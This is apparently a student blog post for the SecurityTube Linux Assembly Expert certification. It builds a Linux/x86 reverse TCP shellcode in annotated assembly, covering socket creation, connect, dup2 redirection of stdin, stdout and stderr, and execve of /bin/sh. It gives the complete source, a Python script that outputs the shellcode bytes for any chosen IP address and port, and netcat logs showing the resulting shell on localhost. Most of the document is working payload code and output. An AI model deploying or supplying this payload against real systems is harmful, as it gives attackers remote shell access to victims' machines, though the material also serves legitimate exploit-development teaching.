# Assignement 2 #

As part of the second exercise, it is requested to realize a shellcode allowing to obtain a distant shell.

The idea here is to create a socket at first the to make a connection giving an IP address and a port ID. The standard outputs stdin, stdout and stderr are redirected in order to be used once the connection is made by a distant shell. 

## Creation of a socket ##
The main reference in bibliography is the documentation of the system calls http://man7.org/linux/man-pages/man2/socketcall.2.html. The socketcall is used to define the actions on the socketsaccording to the call field. The value “1” indicates that we are interested in a socket creation. Here we have to point to a domain, a type and a protocol. protocole is set to IPPROTO_IP = 0,
the type is set to 1 (SOCK_STREAM) and the domain is set to 2 (AF_INET).

```c
	xor ebx, ebx 			; ebx = 0
	mul ebx				; eax=ebx=edx = 0
	push ebx			; push 0 onto the stack   args protocol 0
	inc ebx				; ebx = 1 = SYS_SOCKET = socket()
	push ebx			; push 1 onto the stack	  args SOCK_STREAM 1
	push byte 0x2			; push 2 onto the stack args AF_INET
	mov ecx, esp			; set ecx to the address of our args
	mov al, 0x66			; syscall socketcall
	int 0x80			; make the syscall socketcall(socket(2,1,0))
```

## Creation of the connection ##

We create in the same way the connection indicating the IP address and the logic port ID. We used the sockaddr structure in order to know about the various necessary elements. 

```c
	push 0x0101017f			; @Ip 127.1.1.1
	push dword 0x5c11 		; Port 4444
	inc ebx
    	push word bx     		; we put the value 2 for AF_INET
    	mov ecx, esp	
	push 0x10			; addrlen
	push ecx			; struct *addr
	push edx			; sockfd
	mov bl, 0x3			; SYS_CONNECT = connect()
	mov ecx, esp	
	mov al, 0x66
	int 0x80
```

## Redirection ##

At this stage, we redirect the 3 outputs to the socktfd via the system call système dup2.

```c
	xor ecx, ecx				; set ecx to 0
	mov cl, 0x2				; ecx = 2
_:
	mov al, 0x3f				; syscall dup2
	int 0x80
	dec ecx
	jns _

```

## Shell execution ##
We are going to use execve, int execve(const char *filename, char *const argv[], char *const envp[]) in order to launch the shell.
It will be written as execve("/bin/sh", NULL, NULL).
Then, the shell(/bin/bash) is executed once the connection is made.

```c
	xor ecx,ecx				; ecx = 0
	mul ecx					; eax = edx =ecx = 0
	push eax				; push 0 onto the stack
	push 0x68732f2f				; push //bin/sh
	push 0x6e69622f
	mov ebx, esp				; save esp into ebx
	mov al, 0xb		
	int 0x80				; make the syscall execve("/bin/sh", NULL, NULL)
```



## Code complet ##

```c
; SLAE - Assignment 2: Shell_reverse_Tcp shellcode (Linux/x86)
; Author: Alain Menelet 
; StudentID - SLAE-3763
; Tested on Ubuntu 16.14.03 LTS
; https://github.com/xophidia/Shellcode/blob/master/compile.sh
; Taille : 74 bytes



global _start

section .text

_start:

	; Création du socket
	; http://man7.org/linux/man-pages/man2/socketcall.2.html
	; int socketcall(int call, unsigned long *args)
	; int socket(int domain, int type, int protocol)
	
	; for domain we use AF_INET(0x2)
	; for type SOCK_STREAM(0x1)
	; for protocol IP (0x0)	

	xor ebx, ebx 			; ebx = 0
	mul ebx				; eax=ebx=edx = 0
	push ebx			; push 0 onto the stack
	inc ebx				; ebx = 1
	push ebx			; push 1 onto the stack
	push byte 0x2			; push 2 onto the stack
	mov ecx, esp			; set ecx to the address of our args
	mov al, 0x66			; syscall socketcall
	int 0x80			; make the syscall socketcall(socket(2,1,0))

	xchg edx, eax			; we need to save the result of socket function for later usage

	
	; création de la connexion
	; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
	; we save sockfd just before
	; sockaddr structure

	push 0x0101017f			; @Ip 127.0.0.1
	push dword 0x5c11 		; Port 4444
	inc ebx
    	push word bx     		; Ajout de AF_INET et pour eviter d'avoir un null byte
    	mov ecx, esp	
	push 0x10			; addrlen
	push ecx			; struct *addr
	push edx			; sockfd
	mov bl, 0x3			; connect call
	mov ecx, esp	
	mov al, 0x66
	int 0x80

	
	; redirection des flux via dup
	; nous allons rediriger les sorties standards vers notre socket
	; int dup2(int oldfd, int newfd);

	xor ecx, ecx
	mov cl, 0x2				; ecx = 2
_:
	mov al, 0x3f				; syscall dup2
	int 0x80
	dec ecx
	jns _
	

	; execve
	; execute un shell /bin/bash des la connexion réussie

	xor ecx,ecx				; ecx = 0
	mul ecx					; eax = edx =ecx = 0
	push eax				; push 0 onto the stack
	push 0x68732f2f				; push //bin/sh
	push 0x6e69622f
	mov ebx, esp				; save esp into ebx
	mov al, 0xb		
	int 0x80				; make the syscall execve("/bin/sh", NULL, NULL)

```

## Exécution ##

We use as in the first exercise the file test_shellcode.c with the same options of compilation.

On the first terminal:

```c
./test_shellcode
```

On the second terminal: 

```c
nc -l -p 4444 -v
pwd
/home/xophidia
```

```

## Improve the keying in of the Ip address and port ID ##

At this stage, we’ll use a python script.

```python
#!/usr/bin/env python

import argparse
import struct

def main():
    parser = argparse.ArgumentParser(description="Reverse TCP Shell")
    parser.add_argument('--address', dest="addressIp", default=None, type= str, help="Put your address ip", required=True)
    parser.add_argument('--port', dest="port", default=4444, type=int, help="Put the port", required=True)
    args = parser.parse_args()

    ip = args.addressIp.split('.')
    port = args.port

    shellcode = ("\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x92\x68"+
    struct.pack("!4B",int(ip[0]), int(ip[1]),int(ip[2]), int(ip[3]))+"\x66\x68"+struct.pack("!H",port)+"\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\xb3\x03\x89\xe1\xb0\x66\xcd\x80\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc9\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80");


    print '"' + ''.join('\\x%02x' % ord(c) for c in shellcode) + '";'

if __name__=='__main__':
    main()

```

### Test ###

```c
./createShellcode.py --address 127.1.1.1 --port 1234
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x92\x68\x7f\x01\x01\x01\x66\x68\x04\xd2\x43\x66\x53\x89\xe1\x6a\x10
\x51\x52\xb3\x03\x89\xe1\xb0\x66\xcd\x80\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc9\x89\xca\x52\x68\x2f\x2f\x73\x68\x68
\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";
```

We compile again as in the previous exercise, then we test everything.

```c
nc -l 127.1.1.1 -p 1234 -v
Listening on [127.1.1.1] (family 0, port 1234)
Connection from [127.0.0.1] port 1234 [tcp/*] accepted (family 2, sport 40102)
id
uid=1000(xophidia) gid=1000(xophidia) groups=1000(xophidia),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

StudentID - SLAE-3763